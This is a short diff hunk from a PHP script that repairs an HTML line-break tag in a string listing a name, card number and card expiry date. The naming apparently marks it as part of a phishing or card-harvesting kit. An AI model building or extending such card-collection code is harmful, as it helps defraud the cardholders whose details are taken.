@@ -63,7 +63,7 @@ $state = $status[0];
 
 
 $data ="---------------------<br>
-[$zayad]<br><br
+[$zayad]<br><br>
 name : $name<br>
 card : $card<br>
 exp : $day-$mm<br>
